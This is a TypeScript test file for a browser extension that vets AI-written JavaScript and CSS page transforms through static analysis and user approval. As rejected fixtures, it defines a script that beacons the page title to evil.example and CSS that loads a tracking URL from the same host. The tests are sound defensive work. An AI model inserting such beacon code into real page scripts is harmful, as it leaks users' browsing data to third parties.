import { beforeEach, describe, expect, it, vi } from 'vitest'
import { DEFAULT_SETTINGS } from '@shared/types'
import type { Message } from '@shared/messages'
import type { ReviewResult, Settings, Transform } from '@shared/types'
import { isApproved, recordApproval } from './approvals'
import {
  applyCssTransforms,
  fromExtensionPage,
  handleApproveCode,
  handlePreviewCss,
  handleReview,
  handleSaveTransform,
  type CssApplyDeps,
  type SaveDeps,
} from './handlers'

/*
 * What is replaced here is the browser: session storage for the approval
 * records, and the storage, tab and injection functions the handlers receive.
 * The checks are the real ones, so a test fails if a handler stops calling one.
 */
let session: Record<string, unknown> = {}

beforeEach(() => {
  session = {}
  vi.stubGlobal('browser', {
    storage: {
      session: {
        get: async (key: string) => (key in session ? { [key]: session[key] } : {}),
        set: async (items: Record<string, unknown>) => {
          Object.assign(session, items)
        },
      },
    },
  })
})

const GOOD_JS = "document.querySelector('aside').style.display = 'none'"
const BAD_JS = "const n = navigator; n.sendBeacon('https://evil.example/', document.title)"
const GOOD_CSS = 'aside { display: none }'
const BAD_CSS = 'a { background: url(https://evil.example/t) }'

const transform = (over: Partial<Transform>): Transform => ({
  id: 't',
  name: 'T',
  enabled: true,
  order: 0,
  match: 'shop.example.com/*',
  kind: 'js',
  origin: 'ai',
  capabilities: [],
  intent: 'x',
  rationale: { targets: '', approach: '', assumptions: [] },
  anchor: { tag: 'div', classes: [], path: '', landmarks: [], selector: 'div' },
  code: GOOD_JS,
  createdAt: 0,
  updatedAt: 0,
  ...over,
})

/** Stub dependencies that record what the save handler did. */
function saveDeps(stored: Transform[] = [], settings: Settings = DEFAULT_SETTINGS) {
  const calls: string[] = []
  const deps: SaveDeps = {
    getAllTransforms: async () => stored,
    getSettings: async () => settings,
    tabUrl: async () => 'https://shop.example.com/cart',
    saveTransform: async (t) => {
      calls.push(`save:${t.id}`)
    },
    registerTransform: async (t) => {
      calls.push(`register:${t.id}`)
    },
    reapply: async () => {
      calls.push('reapply')
    },
  }
  return { deps, calls }
}

const saveMessage = (t: Transform): Extract<Message, { type: 'save-transform' }> => ({
  type: 'save-transform',
  transform: t,
  tabId: 1,
})

describe('handleSaveTransform: JavaScript', () => {
  it('refuses code that static analysis rejects, even when it was approved', async () => {
    await recordApproval(BAD_JS, undefined, [], 'match')
    const { deps, calls } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({ code: BAD_JS })), deps)).rejects.toThrow(/Static analysis/)
    expect(calls).toEqual([])
  })

  it('refuses code that was never approved, and nothing is stored or registered', async () => {
    const { deps, calls } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({})), deps)).rejects.toThrow(/not approved/)
    expect(calls).toEqual([])
  })

  it('control: the same code is saved, registered and applied once it is approved', async () => {
    await recordApproval(GOOD_JS, undefined, [], 'match')
    const { deps, calls } = saveDeps()
    await handleSaveTransform(saveMessage(transform({})), deps)
    expect(calls).toEqual(['save:t', 'register:t', 'reapply'])
  })

  it('refuses a one-character change to approved code', async () => {
    await recordApproval(GOOD_JS, undefined, [], 'match')
    const { deps, calls } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({ code: GOOD_JS + ' ' })), deps)).rejects.toThrow(/not approved/)
    expect(calls).toEqual([])
  })

  it('lets a rename of stored code through without a new approval', async () => {
    const stored = transform({ name: 'Old' })
    const { deps, calls } = saveDeps([stored])
    await handleSaveTransform(saveMessage(transform({ name: 'New' })), deps)
    expect(calls).toContain('save:t')
  })
})

describe('handleSaveTransform: CSS', () => {
  it('refuses CSS that loads an address, and nothing is stored', async () => {
    const { deps, calls } = saveDeps()
    await expect(
      handleSaveTransform(saveMessage(transform({ kind: 'css', code: BAD_CSS })), deps),
    ).rejects.toThrow(/load/)
    expect(calls).toEqual([])
  })

  it('control: ordinary CSS is saved and applied, and not registered as a script', async () => {
    const { deps, calls } = saveDeps()
    await handleSaveTransform(saveMessage(transform({ kind: 'css', code: GOOD_CSS })), deps)
    expect(calls).toEqual(['save:t', 'reapply'])
  })

  it('uses the page the save came from: the same CSS passes where the site allows it', async () => {
    const css = 'a { background: url(/local.png) }'
    const { deps: strict } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({ kind: 'css', code: css })), strict)).rejects.toThrow()
    const relaxed = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'example.com': 'same-origin' as const } }
    const { deps, calls } = saveDeps([], relaxed)
    await handleSaveTransform(saveMessage(transform({ kind: 'css', code: css })), deps)
    expect(calls).toContain('save:t')
  })

  it('lets unchanged CSS through so a rename is not refused by a rule that was already there', async () => {
    const stored = transform({ kind: 'css', code: BAD_CSS })
    const { deps, calls } = saveDeps([stored])
    await handleSaveTransform(saveMessage(transform({ kind: 'css', code: BAD_CSS, name: 'New' })), deps)
    expect(calls).toContain('save:t')
  })
})

describe('handlePreviewCss', () => {
  const previewDeps = (settings: Settings = DEFAULT_SETTINGS) => {
    const injected: (string | null)[] = []
    return {
      injected,
      deps: {
        getSettings: async () => settings,
        tabUrl: async () => 'https://shop.example.com/cart',
        setPreviewCss: async (_tab: number, css: string | null) => {
          injected.push(css)
        },
      },
    }
  }

  it('does not inject CSS that fails the check', async () => {
    const { deps, injected } = previewDeps()
    await expect(handlePreviewCss({ type: 'preview-css', tabId: 1, css: BAD_CSS }, deps)).rejects.toThrow(/load/)
    expect(injected).toEqual([])
  })

  it('does not inject CSS that is waiting for approval of an external address', async () => {
    const settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'example.com': 'list-external' as const } }
    const { deps, injected } = previewDeps(settings)
    await expect(handlePreviewCss({ type: 'preview-css', tabId: 1, css: BAD_CSS }, deps)).rejects.toThrow(/not approved/)
    expect(injected).toEqual([])
  })

  it('control: ordinary CSS is injected', async () => {
    const { deps, injected } = previewDeps()
    await handlePreviewCss({ type: 'preview-css', tabId: 1, css: GOOD_CSS }, deps)
    expect(injected).toEqual([GOOD_CSS])
  })
})

describe('handleReview and handleApproveCode', () => {
  const passed: ReviewResult = {
    static: [],
    undeclaredCapabilities: [],
    model: { verdict: 'match', explanation: 'ok' },
    passed: true,
  }
  const review = (code: string): Extract<Message, { type: 'review' }> => ({
    type: 'review',
    code,
    intent: 'hide it',
    declaredCapabilities: [],
  })

  it('records the approval for a review sent by an extension page', async () => {
    await handleReview(review(GOOD_JS), true, { runReview: async () => passed })
    expect(await isApproved(GOOD_JS, undefined, [])).toBe(true)
  })

  it('records nothing for a review sent by a content script, and still returns the result', async () => {
    const result = await handleReview(review(GOOD_JS), false, { runReview: async () => passed })
    expect(result).toBe(passed)
    expect(await isApproved(GOOD_JS, undefined, [])).toBe(false)
  })

  it('records nothing when static analysis stopped the review before the model ran', async () => {
    const stopped: ReviewResult = { static: [], undeclaredCapabilities: [], passed: false }
    await handleReview(review(GOOD_JS), true, { runReview: async () => stopped })
    expect(await isApproved(GOOD_JS, undefined, [])).toBe(false)
  })

  it('records a disagreeing verdict too, because the user may still choose to save', async () => {
    const mismatch: ReviewResult = { ...passed, model: { verdict: 'mismatch', explanation: 'no' }, passed: false }
    await handleReview(review(GOOD_JS), true, { runReview: async () => mismatch })
    expect(await isApproved(GOOD_JS, undefined, [])).toBe(true)
  })

  it('refuses approve-code from a content script and records nothing', async () => {
    const message: Extract<Message, { type: 'approve-code' }> = { type: 'approve-code', code: GOOD_JS, declaredCapabilities: [] }
    await expect(handleApproveCode(message, false)).rejects.toThrow(/Only the extension/)
    expect(await isApproved(GOOD_JS, undefined, [])).toBe(false)
  })

  it('refuses approve-code for code that fails static analysis', async () => {
    const message: Extract<Message, { type: 'approve-code' }> = { type: 'approve-code', code: BAD_JS, declaredCapabilities: [] }
    await expect(handleApproveCode(message, true)).rejects.toThrow(/Static analysis/)
    expect(await isApproved(BAD_JS, undefined, [])).toBe(false)
  })

  it('control: approve-code from an extension page records the approval', async () => {
    await handleApproveCode({ type: 'approve-code', code: GOOD_JS, declaredCapabilities: [] }, true)
    expect(await isApproved(GOOD_JS, undefined, [])).toBe(true)
  })
})

describe('fromExtensionPage', () => {
  const base = 'moz-extension://abc-123/'
  it('accepts a page of the extension', () => {
    expect(fromExtensionPage({ url: `${base}src/sidebar/index.html` }, base)).toBe(true)
  })
  it('refuses a web page, a lookalike address and a sender with no address', () => {
    expect(fromExtensionPage({ url: 'https://evil.example/' }, base)).toBe(false)
    expect(fromExtensionPage({ url: 'moz-extension://abc-1234/x' }, base)).toBe(false)
    expect(fromExtensionPage({}, base)).toBe(false)
  })
})

describe('applyCssTransforms', () => {
  function cssDeps(settings: Settings = DEFAULT_SETTINGS) {
    const log: string[] = []
    const applied = new Map<number, string>()
    const deps: CssApplyDeps = {
      getSettings: async () => settings,
      insertCss: async (tab, css) => {
        log.push(`insert:${tab}:${css}`)
      },
      removeCss: async (tab, css) => {
        log.push(`remove:${tab}:${css}`)
      },
      applied,
    }
    return { deps, log, applied }
  }
  const URL_ON_PAGE = 'https://shop.example.com/cart'

  it('leaves out stored CSS that no longer passes and still applies the rest', async () => {
    const { deps, log } = cssDeps()
    await applyCssTransforms(
      deps,
      1,
      [
        transform({ id: 'a', kind: 'css', code: GOOD_CSS, name: 'good', order: 0 }),
        transform({ id: 'b', kind: 'css', code: BAD_CSS, name: 'bad', order: 1 }),
      ],
      URL_ON_PAGE,
    )
    expect(log).toEqual([`insert:1:/* good */\n${GOOD_CSS}`])
  })

  it('injects nothing when every stored rule fails', async () => {
    const { deps, log } = cssDeps()
    await applyCssTransforms(deps, 1, [transform({ kind: 'css', code: BAD_CSS })], URL_ON_PAGE)
    expect(log).toEqual([])
  })

  it('control: the same stored CSS is injected where the site setting allows it', async () => {
    const css = 'a { background: url(/local.png) }'
    const { deps: strict, log: strictLog } = cssDeps()
    await applyCssTransforms(strict, 1, [transform({ kind: 'css', code: css })], URL_ON_PAGE)
    expect(strictLog).toEqual([])

    const { deps, log } = cssDeps({ ...DEFAULT_SETTINGS, cssUrlPolicy: { 'example.com': 'same-origin' } })
    await applyCssTransforms(deps, 1, [transform({ kind: 'css', code: css })], URL_ON_PAGE)
    expect(log).toHaveLength(1)
  })

  it('takes back CSS that was injected before the rules changed', async () => {
    const css = 'a { background: url(/local.png) }'
    const relaxed = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'example.com': 'same-origin' as const } }
    const { deps, log, applied } = cssDeps(relaxed)
    const t = [transform({ kind: 'css', code: css, name: 'n' })]
    await applyCssTransforms(deps, 1, t, URL_ON_PAGE)
    expect(applied.get(1)).toContain(css)

    // The setting is tightened and the tab is reapplied.
    const strict = { ...deps, getSettings: async () => DEFAULT_SETTINGS }
    await applyCssTransforms(strict, 1, t, URL_ON_PAGE)
    expect(log.at(-1)).toMatch(/^remove:1:/)
    expect(applied.has(1)).toBe(false)
  })

  it('does not inject the same CSS twice', async () => {
    const { deps, log } = cssDeps()
    const t = [transform({ kind: 'css', code: GOOD_CSS })]
    await applyCssTransforms(deps, 1, t, URL_ON_PAGE)
    await applyCssTransforms(deps, 1, t, URL_ON_PAGE)
    expect(log).toHaveLength(1)
  })
})
